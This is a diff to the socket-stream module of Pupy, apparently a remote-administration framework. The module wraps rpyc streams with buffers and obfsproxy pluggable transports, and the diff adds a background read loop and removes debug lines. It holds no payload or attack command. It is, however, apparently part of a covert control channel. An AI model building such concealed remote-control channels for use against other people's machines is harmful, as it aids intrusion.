@@ -1,6 +1,8 @@
-#!/usr/bin/env python
 # -*- coding: UTF8 -*-
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 """ abstraction layer over rpyc streams to handle different transports and integrate obfsproxy pluggable transports """
+import sys
 from rpyc.core import SocketStream
 from .buffer import Buffer
 import socket
@@ -9,6 +11,8 @@ import errno
 import logging
 import traceback
 from rpyc.lib.compat import select, select_error, BYTES_LITERAL, get_exc_errno, maxint
+import threading
+retry_errnos = (errno.EAGAIN, errno.EWOULDBLOCK)
 
 class PupySocketStream(SocketStream):
 	def __init__(self, sock, transport_class):
@@ -21,6 +25,9 @@ class PupySocketStream(SocketStream):
 		self.downstream=Buffer(on_write=self._upstream_recv)
 		self.transport=transport_class(self)
 		self.on_connect()
+		#self.async_read_thread=threading.Thread(target=self._downstream_recv_loop)
+		#self.async_read_thread.daemon=True
+		#self.async_read_thread.start()
 
 	def on_connect(self):
 		self.transport.on_connect()
@@ -28,7 +35,6 @@ class PupySocketStream(SocketStream):
 
 	def _read(self):
 		try:
-			#buf = self.sock.recv(min(self.MAX_IO_CHUNK, count))
 			buf = self.sock.recv(self.MAX_IO_CHUNK)
 		except socket.timeout:
 			return
@@ -52,23 +58,29 @@ class PupySocketStream(SocketStream):
 
 	def _upstream_recv(self):
 		""" called as a callback on the downstream.write """
-		#print "upstream_recv"
-		#print "downstream=%s"%len(self.downstream)
-		#print "upstream=%s"%len(self.upstream)
 		if len(self.downstream)>0:
-			#print "writing %s"%len(self.downstream.peek())
 			super(PupySocketStream, self).write(self.downstream.read())
+
+	def _downstream_recv_loop(self):
+		try:
+			while True:
+				self._read()
+				self.transport.downstream_recv(self.buf_in)
+		except EOFError as e:
+			self.upstream.set_eof(e)
+
 
 	def read(self, count):
 		try:
 			if len(self.upstream)>=count:
 				return self.upstream.read(count)
 			while len(self.upstream)<count:
-				if self.sock_poll(0):#to avoid waiting on the socket while a transport write on the upstream buffer resulting in deadlock
+				if self.sock_poll(0):
 					self._read()
 					self.transport.downstream_recv(self.buf_in)
-				if len(self.upstream)<count:
-					time.sleep(0.1)#to avoid active wait
+				#it seems we can actively wait here with only perf enhancement
+				#if len(self.upstream)<count:
+				#	self.upstream.wait(0.1)#to avoid active wait
 			return self.upstream.read(count)
 		except Exception as e:
 			logging.debug(traceback.format_exc())
